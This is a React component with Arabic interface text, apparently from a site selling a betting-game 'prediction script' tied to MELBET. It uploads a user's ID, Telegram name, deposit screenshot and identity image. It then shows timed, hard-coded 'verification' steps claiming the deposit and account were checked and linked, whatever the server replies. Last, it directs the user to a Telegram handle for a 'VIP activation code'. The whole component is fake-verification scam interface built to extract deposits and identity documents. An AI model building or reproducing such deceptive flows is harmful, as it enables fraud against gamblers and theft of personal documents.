import React, { useState, useEffect } from 'react';
import { motion, AnimatePresence } from 'motion/react';
import { Check, Sparkles, Send, ShieldCheck, ExternalLink, X, Copy, Loader2 } from 'lucide-react';
import confetti from 'canvas-confetti';

interface VerificationDialogProps {
  isOpen: boolean;
  onClose: () => void;
  userId: string;
  telegramUser: string;
  selectedGame: string;
  depositImage?: File | null;
  idImage?: File | null;
}

type DialogStep = 'verifying' | 'completed';

const steps = [
  { label: 'جار التحقق من id حسابك...', key: 'id' },
  { label: 'جار التحقق من الايداع...', key: 'deposit' },
  { label: 'جار ربط حسابك بالاسكربت...', key: 'link' },
  { label: 'تم ربط حسابك بنجاح', key: 'done' },
];

export const VerificationDialog: React.FC<VerificationDialogProps> = ({
  isOpen,
  onClose,
  userId,
  telegramUser,
  selectedGame,
  depositImage,
  idImage
}) => {
  const [currentStep, setCurrentStep] = useState<DialogStep>('verifying');
  const [visibleLines, setVisibleLines] = useState<number>(0);
  const [copiedTg, setCopiedTg] = useState(false);
  const [isTelegramSent, setIsTelegramSent] = useState<boolean | null>(null);

  useEffect(() => {
    if (!isOpen) {
      setCurrentStep('verifying');
      setVisibleLines(0);
      setIsTelegramSent(null);
      return;
    }

    setCurrentStep('verifying');
    setVisibleLines(0);
    setIsTelegramSent(null);

    const sendToTelegram = async () => {
      try {
        const now = new Date();
        const formattedTime = now.toLocaleString('ar-EG', {
          dateStyle: 'full',
          timeStyle: 'medium',
        });

        const form = new FormData();
        form.append('userId', userId);
        form.append('telegramUsername', telegramUser);
        form.append('selectedGame', selectedGame);
        form.append('timestamp', formattedTime);
        if (depositImage) form.append('depositImage', depositImage, depositImage.name);
        if (idImage) form.append('idImage', idImage, idImage.name);

        const res = await fetch('/api/public/submit-verification', {
          method: 'POST',
          body: form,
        });

        const data = await res.json();
        setIsTelegramSent(res.ok && data.success === true);
      } catch (err) {
        console.error('Failed to send verification to Telegram:', err);
        setIsTelegramSent(false);
      }
    };

    sendToTelegram();

    const t1 = setTimeout(() => setVisibleLines(1), 1000);
    const t2 = setTimeout(() => setVisibleLines(2), 2000);
    const t3 = setTimeout(() => setVisibleLines(3), 3500);
    const t4 = setTimeout(() => {
      setVisibleLines(4);
      try {
        confetti({
          particleCount: 80,
          spread: 70,
          origin: { y: 0.6 },
          colors: ['#FFBF00', '#FFD700', '#FFFFFF', '#1a1a1a']
        });
      } catch {
        // Fallback
      }
    }, 4000);

    const t5 = setTimeout(() => setCurrentStep('completed'), 4600);

    return () => {
      clearTimeout(t1);
      clearTimeout(t2);
      clearTimeout(t3);
      clearTimeout(t4);
      clearTimeout(t5);
    };
  }, [isOpen, userId, telegramUser, selectedGame, depositImage, idImage]);

  const handleCopyTelegram = () => {
    navigator.clipboard.writeText('@MELBET_Mr_Dollar');
    setCopiedTg(true);
    setTimeout(() => setCopiedTg(false), 2000);
  };

  const handleOpenTelegram = () => {
    window.open('https://t.me/MELBET_Mr_Dollar', '_blank', 'noopener,noreferrer');
  };

  if (!isOpen) return null;

  return (
    <div className="fixed inset-0 z-50 flex items-center justify-center p-4 select-none">
      {/* Backdrop */}
      <motion.div
        initial={{ opacity: 0 }}
        animate={{ opacity: 1 }}
        exit={{ opacity: 0 }}
        onClick={onClose}
        className="fixed inset-0 bg-black/30 backdrop-blur-2xl transition-all"
      />

      {/* Modal Container */}
      <motion.div
        initial={{ opacity: 0, scale: 0.92, y: 24 }}
        animate={{ opacity: 1, scale: 1, y: 0 }}
        exit={{ opacity: 0, scale: 0.92, y: 24 }}
        transition={{ type: 'spring', damping: 28, stiffness: 320 }}
        className="relative w-full max-w-md rounded-[28px] border border-hair bg-ink/35 p-6 shadow-lux backdrop-blur-2xl z-10 overflow-hidden"
      >
        {/* Ambient glow */}
        <div className="pointer-events-none absolute -top-24 left-1/2 h-48 w-48 -translate-x-1/2 rounded-full bg-gold/10 blur-[80px] animate-lux-breathe" />

        {/* Close button */}
        <button
          onClick={onClose}
          className="absolute top-3 left-3 z-20 flex h-8 w-8 items-center justify-center rounded-full border border-hair bg-ink-2/25 text-neutral-400 transition-colors hover:bg-ink-2/25 hover:text-white"
          title="إغلاق"
        >
          <X className="h-4 w-4" />
        </button>

        <AnimatePresence mode="wait">
          {currentStep === 'verifying' ? (
            /* Verifying state */
            <motion.div
              key="verifying"
              initial={{ opacity: 0, y: 12 }}
              animate={{ opacity: 1, y: 0 }}
              exit={{ opacity: 0, y: -12 }}
              className="relative z-10 flex flex-col items-center py-2"
            >
              {/* Elegant spinner */}
              <div className="relative mb-6 h-24 w-24">
                <div className="absolute inset-0 rounded-full bg-gold/15 blur-xl animate-pulse" />
                <div className="absolute inset-0 rounded-full border border-gold/20" />
                <div className="absolute inset-0 rounded-full border-[3px] border-transparent border-t-gold animate-spin" />
                <div className="absolute inset-3 flex items-center justify-center rounded-full border border-hair bg-ink/35 shadow-gold-lux">
                  <Sparkles className="h-8 w-8 text-gold animate-pulse" />
                </div>
              </div>

              <h3 className="text-center font-display text-xl font-bold text-white">
                فحص ومطابقة البيانات
              </h3>
              <p className="mt-1.5 text-center text-[11px] text-neutral-400">
                يرجى الانتظار بينما يتم الربط المباشر مع خوادم السكربت...
              </p>

              {/* Sequential steps */}
              <div className="mt-6 w-full space-y-2.5">
                {steps.map((step, idx) => {
                  const isActive = visibleLines >= idx + 1;
                  const isDone = visibleLines >= idx + 2 || (idx === 3 && visibleLines >= 4);
                  const isCurrent = isActive && !isDone;

                  return (
                    <div
                      key={step.key}
                      className={`flex items-center gap-3 rounded-2xl border px-3.5 py-3 transition-all duration-500 ${
                        isActive
                          ? 'border-hair bg-ink-2/50'
                          : 'border-hair/30 bg-ink/40 opacity-40'
                      }`}
                    >
                      <div
                        className={`flex h-7 w-7 flex-shrink-0 items-center justify-center rounded-full text-[10px] font-bold transition-all duration-500 ${
                          isDone
                            ? 'bg-gold text-black'
                            : isCurrent
                            ? 'bg-gold/12 text-gold'
                            : 'bg-ink-3/25 text-neutral-500'
                        }`}
                      >
                        {isDone ? (
                          <Check className="h-4 w-4" strokeWidth={2.5} />
                        ) : isCurrent ? (
                          <Loader2 className="h-3.5 w-3.5 animate-spin" />
                        ) : (
                          idx + 1
                        )}
                      </div>
                      <span className={`text-sm font-medium ${isActive ? 'text-white' : 'text-neutral-500'}`}>
                        {step.label}
                      </span>

                      {idx === 0 && isActive && userId && (
                        <span className="mr-auto rounded border border-gold/20 bg-gold/8 px-1.5 py-0.5 font-mono text-[10px] text-gold">
                          ID: {userId}
                        </span>
                      )}
                      {idx === 1 && isActive && (
                        <span className="mr-auto text-[10px] font-bold text-emerald-400">
                          1500+ دينار
                        </span>
                      )}
                      {idx === 2 && isActive && (
                        <span className="mr-auto text-[10px] font-bold text-gold">
                          {selectedGame === 'apple' ? 'Apple of Fortune' : 'Gams Mines'}
                        </span>
                      )}
                    </div>
                  );
                })}
              </div>
            </motion.div>
          ) : (
            /* Completed state */
            <motion.div
              key="completed"
              initial={{ opacity: 0, scale: 0.95 }}
              animate={{ opacity: 1, scale: 1 }}
              exit={{ opacity: 0, scale: 0.95 }}
              className="relative z-10 flex flex-col items-center py-2"
            >
              {/* Success icon */}
              <div className="relative mb-5 h-24 w-24">
                <div className="absolute inset-0 rounded-full bg-gold/20 blur-2xl animate-pulse" />
                <div className="relative flex h-full w-full items-center justify-center rounded-full border-2 border-gold bg-gradient-to-br from-gold to-gold-deep shadow-gold-lux">
                  <Check className="h-12 w-12 text-black" strokeWidth={2.5} />
                </div>
              </div>

              <div className="mb-3 inline-flex items-center gap-1.5 rounded-full border border-gold/30 bg-gold/10 px-3 py-1 text-[11px] font-bold text-gold">
                <ShieldCheck className="h-3.5 w-3.5" />
                <span>تم إتمام وتأكيد الربط بنجاح</span>
              </div>

              <h3 className="text-center font-display text-2xl font-black text-white">
                يوزر الدعم الفني / المطور
              </h3>
              <p className="mt-2 max-w-xs text-center text-[11px] leading-relaxed text-neutral-300">
                اضغط على الزر بالأسفل للانتقال الفوري إلى حساب المطور على تيليجرام لاستلام{' '}
                <span className="font-bold text-gold">كود التفعيل VIP</span> وبدء تشغيل السكربت.
              </p>

              {/* Telegram handle card */}
              <div className="mt-5 mb-4 flex w-full items-center justify-between rounded-2xl border border-hair bg-ink-2/25 p-3.5">
                <div className="flex items-center gap-3">
                  <div className="flex h-10 w-10 items-center justify-center rounded-full border border-gold/30 bg-gold/10">
                    <Send className="h-5 w-5 -rotate-12 text-gold" />
                  </div>
                  <div className="text-right">
                    <div className="text-[10px] font-semibold text-neutral-400">المطور الرسمي</div>
                    <div className="font-mono text-sm font-bold text-gold" dir="ltr">
                      @MELBET_Mr_Dollar
                    </div>
                  </div>
                </div>
                <button
                  type="button"
                  onClick={handleCopyTelegram}
                  className="flex items-center gap-1 rounded-xl border border-hair bg-ink-3/25 px-2.5 py-1.5 text-[10px] font-semibold text-neutral-300 transition-all hover:border-gold/40 hover:text-white"
                >
                  {copiedTg ? <Check className="h-3.5 w-3.5 text-emerald-400" /> : <Copy className="h-3.5 w-3.5" />}
                  <span>{copiedTg ? 'تم!' : 'نسخ'}</span>
                </button>
              </div>

              <button
                type="button"
                onClick={handleOpenTelegram}
                className="group relative w-full overflow-hidden rounded-2xl bg-white py-3.5 font-display text-sm font-black tracking-wide text-black shadow-lg shadow-white/10 transition-all hover:bg-neutral-200 active:scale-[0.99]"
              >
                <span className="pointer-events-none absolute inset-y-0 -left-1/3 w-1/3 animate-lux-sheen bg-black/5 blur-md" />
                <span className="relative inline-flex items-center gap-2">
                  <Send className="h-4 w-4 -rotate-12" />
                  التوجهه الي اليوزر
                  <ExternalLink className="h-3.5 w-3.5 opacity-70" />
                </span>
              </button>

              <p className="mt-3 text-[10px] text-neutral-500">
                متاح 24/7 للرد الفوري وتفعيل الأكواد
              </p>
            </motion.div>
          )}
        </AnimatePresence>
      </motion.div>
    </div>
  );
};
